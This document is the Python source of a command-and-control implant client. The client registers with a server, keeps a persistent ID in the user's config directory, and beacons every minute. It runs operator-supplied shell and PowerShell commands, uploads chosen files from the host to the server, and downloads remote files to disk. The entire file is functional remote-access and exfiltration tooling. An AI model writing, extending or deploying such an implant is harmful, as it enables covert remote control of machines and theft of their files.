import requests
import time
import subprocess
import getpass
import os

class C2Client:
    def __init__(self, server_url):
        self.server_url = server_url
        self.key_dir = self.get_key_dir()
        self.key_file_path = os.path.join(self.key_dir, "client_id.txt")
    
        if os.path.exists(self.key_file_path):
            with open(self.key_file_path, "r") as f:
                self.client_id = f.read().strip()
        else:
            os.makedirs(self.key_dir, exist_ok=True)
            self.client_id = ""
    
    def register(self):
        url = f"{self.server_url}/register"
        username = getpass.getuser()

        if not self.client_id:
            payload = {"username": username, "client_id": "", "op_system": os.name}
            response = requests.post(url, json=payload)
            self.client_id = response.json().get("client_id")
            
            with open(self.key_file_path, "w") as f:
                f.write(self.client_id)
            
            print(response.json())
        else:
            print(f"Using existing client ID: {self.client_id}")

    def get_key_dir(self):
        if os.name == 'nt':
            return os.path.join(os.getenv('APPDATA'), "client-prop")
        else:
            return os.path.join(os.path.expanduser("~"), ".config", "client-prop")

    def beacon(self):
        url = f"{self.server_url}/beacon"
        payload = {"client_id": self.client_id}
        
        operations = requests.post(url, json=payload).json()
        self.handle_operations(operations)

    def report(self, status, result):
        url = f"{self.server_url}/report"
        payload = {"client_id": self.client_id, "status": status, "result": result}
        
        response = requests.post(url, json=payload)
        print(response.json())

    def run(self):
        self.register()
        while True:
            self.beacon()
            time.sleep(60) # Timeout before next beacon call
            
    def handle_operations(self, operations):
        for op in operations:
            resource = op.get("resource")
            match op.get("mode"):
                case "CMD":
                    self.handle_cmd_operation(resource)
                case "IMP":
                    self.handle_imp_operation(resource)
                case "FDL":
                    key = op.get("fdl_key")
                    self.handle_fdl_operation(resource, key)
                case "FUP":
                    target_dir = op.get("target_dir")
                    execute = op.get("execute")
                    
                    self.handle_fup_operation(resource, target_dir, execute)

    def handle_cmd_operation(self, command):
        cmd_out = ""
        status = "CMD_SUCCESS"
        try:
            cmd_out = subprocess.getoutput(command)
        except Exception as e:
            status = "ERROR"
            cmd_out = str(e)
            
        self.report(status, cmd_out)
    
    def handle_imp_operation(self, ps_script):
        cmd_out = ""
        status = "PS_SUCCESS"
        try:
            raw_out = subprocess.run(["powershell", "-Command", ps_script], capture_output=True)
            cmd_out = raw_out.stdout.decode("utf-8")
        except Exception as e:
            status = "ERROR"
            cmd_out = str(e)
            
        self.report(status, cmd_out)
    
    def handle_fdl_operation(self, file_path, key):
        try:         
            if not os.path.exists(file_path):
                print("Target path not found...")
            else:
                url = f"{self.server_url}/upload"
                with open(file_path, "rb") as f:
                    print("CLIENT-OTK: " + key)
                    payload = {
                        "status": "SUCCESS",
                        "client_id": self.client_id,
                        "file_name": file_path.split("\\")[-1],
                        "fdl_key": key
                    }
                    
                    requests.post(url, data=payload, files={"file": f})
                
                print("[+] Successfully sent file.")
        except Exception as e:
            print(str(e))
    
    def handle_fup_operation(self, resource, target_dir, execute):
        try:
            response = requests.get(resource)
            with open(target_dir, "wb") as f:
                f.write(response.content)
                
            print(f"Downloaded {resource} successfully.")
        except Exception as e:
            print(f"Error downloading {resource} on client.")

if __name__ == "__main__":
    client = C2Client("http://localhost:9393")
    client.run()